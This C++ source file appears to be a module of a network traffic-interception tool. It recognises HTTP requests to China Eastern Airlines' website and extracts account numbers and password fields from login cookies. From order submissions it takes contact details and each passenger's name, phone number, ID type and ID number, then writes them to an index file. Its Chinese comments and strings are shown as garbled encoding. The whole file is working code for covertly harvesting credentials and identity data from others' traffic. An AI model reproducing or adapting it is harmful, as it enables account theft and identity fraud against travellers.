
#include "StdAfx.h"

#include "ChinaEastern.h"

plane::ChinaEastern::ChinaEastern(HttpSession *http_session, const string &pro_name) : Airplane(http_session,pro_name)
{
	
}

plane::ChinaEastern::~ChinaEastern()
{
	
}

// NI ���֤��PP ���գ�ORI ����֤��MIL ����֤��OTHER ������HTPP �۰�ͨ��֤��BR ��������
string plane::ChinaEastern::GetIdType(string idType)
{
	string idTypeTrue;
	if (idType == "NI"){idTypeTrue = "���֤";}
	if (idType == "PP"){idTypeTrue = "����";}
	if (idType == "ORI"){idTypeTrue = "����֤";}
	if (idType == "MIL"){idTypeTrue = "����֤";}
	if (idType == "OTHER"){idTypeTrue = "����";}
	if (idType == "HTPP"){idTypeTrue = "�۰�ͨ��֤";}
	if (idType == "BR"){idTypeTrue = "��������";}
	return idTypeTrue;
}

int plane::ChinaEastern::IsChinaEastern(HttpSession *http_session)
{
	//��¼
	if((http_session->m_Requestline.m_Host.Find("www.ceair.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/member/auth!fullLoginCheck.shtml?")!=-1) )
	{
		return kpclogin;
	}
	//�г�Ԥ��
	if((http_session->m_Requestline.m_Host.Find("www.ceair.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/otabooking/flight-search!doFlightSearch.shtml?")!=-1))
	{
		return kpcticket;
	}
	//�ύ����
	if((http_session->m_Requestline.m_Host.Find("www.ceair.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/otabooking/paxinfo-input!showBookingInfoNew.shtml")!=-1) )
	{
		return kpcorder;
	}
	return 0;
}

int plane::ChinaEastern::Process(const char *packet,int action)
{
	//��¼
	if (action == kpclogin)
	{
		return pclogin(packet);
	}
	//�г�Ԥ��
	if (action == kpcticket)
	{
		return pcticket(packet);
	}
	//�ύ����
	if (action == kpcorder)
	{
		return pcorder(packet);
	}
	return 1;
}

//��¼
int plane::ChinaEastern::pclogin(const char *packet)
{
	//��cookie �л��user_
	string cookie(http_session_->m_Requestline.m_Cookie.GetBuffer(0));
	cookie = ms_->UrlDecode(cookie);
	ms_->SplitStringToMap(cookie, ';','=');
	//�˺�
    string username = ms_->GetValueFromMapByKey("ffpno",true);
	//����(�Ѽ���)
	string password = ms_->GetValueFromMapByKey("passportId",true);
	if (username.empty() || password.empty())
	{
		return 0;
	}
	output_text_ =
		"user=" + username + "\r\n" + //�˺�
		"pass=" + password + "\r\n" + //����
		"state=��¼\r\n";
	WriteIndexFile();
	return 1;
}

// �г�Ԥ��
int plane::ChinaEastern::pcticket(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	string src_dataEnd = ms_->GetValueFromMapByKey("searchCond",true);

	//ʹ��json ��ȡ����
	Json::Reader reader;
	Json::Value value;
	if (reader.parse(src_dataEnd,value))
	{
		//����
		string tripType = value["tripType"].asString();
		int adtCount = value["adtCount"].asInt();
		int chdCount = value["chdCount"].asInt();
		int infCount = value["infCount"].asInt();

		CString adultCount,childCount,infantCount;
		adultCount.Format("%d",adtCount);
		childCount.Format("%d",chdCount);
		infantCount.Format("%d",infCount);

		string adutcount,childcount,infantcount;
		adutcount = adultCount.GetBuffer(0);
		childcount = childCount.GetBuffer(0);
		infantcount = infantCount.GetBuffer(0);
       
		Json::Value segmentList = value["segmentList"];
		//����
		if (tripType == "OW")
		{
			int i = 0;
			//��������
			string deptDt = segmentList[i]["deptDt"].asString();
			//������
			string deptCdTxt = segmentList[i]["deptCdTxt"].asString();
			//Ŀ�ĵ�
			string arrCdTxt = segmentList[i]["arrCdTxt"].asString();

			output_text_ =
				"netmark=" +	adutcount + "\r\n" +	//��������
				"onick=" +	childcount + "\r\n" +		//��ͯ����
				"sex=" +	infantcount + "\r\n" +		//Ӥ������
				"nick=" +	deptCdTxt + "\r\n" +		//������
				"msg=" + 	arrCdTxt + "\r\n" +			//Ŀ�ĵ� 
				"servername=" + deptDt + "\r\n" +		//��������
				"state=��ѯ\r\n";
			WriteIndexFile();
		}
		//����
		if (tripType == "RT")
		{
			int i = 0;
			int j = 1;
			//��������
			string deptDt = segmentList[i]["deptDt"].asString();
			//������
			string deptCdTxt = segmentList[i]["deptCdTxt"].asString();
			//Ŀ�ĵ�
			string arrCdTxt = segmentList[i]["arrCdTxt"].asString();
			//��������
			string deptDtRe = segmentList[j]["deptDt"].asString();

			output_text_ =
				"netmark=" + adutcount + "\r\n" +	//��������
				"onick=" +	childcount + "\r\n" +	//��ͯ����
				"sex=" +	infantcount + "\r\n" +	//Ӥ������
				"nick=" +	deptCdTxt + "\r\n" +	//������
				"msg=" + 	arrCdTxt + "\r\n" +		//Ŀ�ĵ� 
				"servername=" + deptDt + "\r\n" +	//��������
				"appname=" + deptDtRe + "\r\n" +	//��������
				"state=��ѯ\r\n";
			WriteIndexFile();
		}
	}
	return 1;
}

//�ύ����
int plane::ChinaEastern::pcorder(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');

	//��ϵ����Ϣ
	string contactInfo = ms_->GetValueFromMapByKey("contactInfo",true);
	string contactName,contactMobile,contackEmail;
	//��ȡjson
	Json::Reader readerContact;
	Json::Value valueContact;
	if (readerContact.parse(contactInfo,valueContact))
	{
		contactName = valueContact["contactName"].asString();
		contactMobile = valueContact["contactMobile"].asString();
		contackEmail = valueContact["contactEmail"].asString();
	}
	//�˿���Ϣ
	string allinfo = ms_->GetValueFromMapByKey("allPaxInfo",true);
	//��ȡjson
	Json::Reader readerPassenger;
	Json::Value valuePassenger;
	if (readerPassenger.parse(allinfo,valuePassenger))
	{
		for (int i=0;i<valuePassenger.size();i++)
		{
			string passengerName,passengerIDtypeTemp,passengerIDtype,passengerIDcard,passengerTel;

			passengerName = valuePassenger[i]["paxName"].asString();
			if (passengerName.empty())
			{
				passengerName = valuePassenger[i]["paxNameFirst"].asString();
			}
			passengerIDtypeTemp = valuePassenger[i]["idType"].asString();
			passengerIDtype = GetIdType(passengerIDtypeTemp);
			passengerIDcard = valuePassenger[i]["idNo"].asString();
			passengerTel = valuePassenger[i]["mobile"].asString();

			output_text_ =
				"mid=" + 	contactName + "\r\n" +		//��ϵ������
				"oid=" + 	contactMobile + "\r\n" +	//��ϵ�˵绰
				"msgtype=" + passengerName + "\r\n" +	//�˿�����
				"clientmsg=" + passengerTel + "\r\n" +	//�˿͵绰
				"webname=" + passengerIDtype + "\r\n" + //�˿�֤������
				"subject=" + passengerIDcard + "\r\n" + //�˿�֤����
				"state=�ύ����\r\n";
			WriteIndexFile();
		}
	}
	return 1;
}
